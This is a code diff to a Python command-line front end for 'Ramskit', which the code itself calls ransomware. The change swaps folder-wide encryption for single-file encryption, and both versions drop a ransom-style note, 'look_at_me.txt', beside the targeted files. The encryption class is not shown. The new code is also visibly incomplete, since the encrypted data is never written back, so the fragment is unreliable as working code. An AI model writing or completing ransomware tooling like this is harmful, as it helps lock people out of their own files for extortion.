@@ -26,8 +26,6 @@ import argparse
 # TODO 2: Check CLI args
 def main() -> None:
     parser = argparse.ArgumentParser(description="Ramskit - CLI Tool for Ramskit Ransomware")
-    parser.add_argument('-o', '--operating-system', dest="operating_system", required=True,
-                        help='Current operating system [linux/windows]')
     parser.add_argument('-a', '--action', dest="action", required=True,
                         help='Action to perform [encrypt/decrypt/generate_key]')
     parser.add_argument('-p', '--path', dest="path", help='Path to file(s) to encrypt/decrypt')
@@ -36,32 +34,24 @@ def main() -> None:
     ramskit = Ramskit()
     key = ramskit.load_key()
 
-    operating_system = args.operating_system
     action = args.action.lower()
     path = args.path
 
     # FIXME 2: Encrypt/decrypt
     if action == 'encrypt':
-        items = os.listdir(path)
+        if not os.path.isfile(path):
+            print(f"[x] The file {path} does not exist. Exiting...")
+            sys.exit(1)
 
-        # Just if list comprehension does not work as expected
-        if operating_system == 'linux':
-            full_path = [path + '/' + item for item in items]
-            with open(path + '/' + 'look_at_me.txt', 'w') as f:
-                f.write('''
-                    Heyo, this file has been encrypted!. \n\n
-                ''')
-        elif operating_system == 'windows':
-            full_path = [path + '\\' + item for item in items]
-            with open(path + '\\' + 'look_at_me.txt', 'w') as f:
-                f.write('''
-                    Heyo, this file has been encrypted!. \n\n
-                ''')
-        else:
-            print("[x] No OS typed. Exiting...")
-            sys.exit(0)
+        # Implement all this stuff
+        full_path = os.path.abspath(path)
+        encrypted_file_path = os.path.join(os.path.dirname(full_path), 'look_at_me.txt')
 
-        ramskit.encrypt_file(full_path, key)
+        with open(full_path, 'rb') as file:
+            encrypted_data = ramskit.encrypt_file(file.read(), key)
+
+        with open(encrypted_file_path, 'w') as file:
+            file.write('Heyo, this file has been encrypted!. \n\n')
 
     elif action == 'decrypt':
         # FIXME 4: Check and fix key
